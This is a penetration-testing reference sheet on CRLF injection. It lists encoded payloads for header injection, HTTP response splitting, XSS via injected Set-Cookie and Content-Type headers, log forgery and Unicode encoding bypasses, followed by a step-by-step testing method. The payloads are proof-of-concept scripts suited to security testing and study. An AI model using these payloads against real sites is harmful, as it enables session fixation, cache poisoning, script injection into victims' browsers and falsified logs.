# CRLF Injection

## Overview
Carriage Return Line Feed (\r\n) injection into HTTP headers to split responses, inject headers, or achieve XSS via header-based injection.

## CRLF Characters
```
\r\n = %0d%0a = CR + LF
\n = %0a = LF only (often sufficient)
\r = %0d
```

## Header Injection
```
# Inject into URL parameter reflected in Location/Set-Cookie
GET /redirect?url=https://target.com%0d%0aSet-Cookie:session=hijacked

# Inject new headers
GET /page?lang=en%0d%0aX-Injected:value%0d%0a

# Inject into existing header value
GET /page
Host: target.com%0d%0aX-Forwarded-For:127.0.0.1
```

## HTTP Response Splitting
```
# Inject \r\n\r\n to split response body
GET /redirect?url=https://evil.com%0d%0a%0d%0a<html><script>alert(1)</script>

# Full response splitting:
%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>

# In Location header:
Location: https://target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Hacked</h1>
```

## XSS via CRLF
```
# Inject script via Set-Cookie
GET /set-lang?lang=en%0d%0aSet-Cookie:lang=<script>alert(1)</script>

# Header injection leading to XSS
%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>
```

## Log Injection
```
# Inject into log-destined parameters
username=admin%0aINFO: Login successful for admin
# Creates false log entry
```

## Common Injection Points
```
# Redirect URLs
/redirect?to=https://target.com
/login?next=/dashboard

# Language/locale parameters
?lang=en
?locale=en-US

# Callback URLs
?callback=https://target.com/cb

# Any parameter reflected in headers (Location, Set-Cookie, etc.)
```

## Encoding Variations
```
%0d%0a   → \r\n (standard)
%0a      → \n (LF only — may work)
%0d      → \r
%E5%98%8A%E5%98%8D  → Unicode CRLF (\u560a\u560d)
\r\n     → literal (in some contexts)
\n       → literal
```

## Testing Methodology
1. Find parameters reflected in response headers
2. Test with %0d%0a followed by a new header
3. Check response for injected header
4. Test %0a alone if %0d%0a is filtered
5. Try Unicode variants
6. Attempt response splitting (inject double CRLF + body)
7. Test log injection if input goes to logs

## Vulnerable Contexts
- Redirect parameters (Location header)
- Cookie setting endpoints
- Language/locale selection
- User profile fields reflected in headers
- API responses setting headers from user input

## Impact
- XSS via response body injection
- Session fixation via Set-Cookie injection
- Cache poisoning via injected Cache-Control
- Log forgery
- Header injection for downstream processing abuse
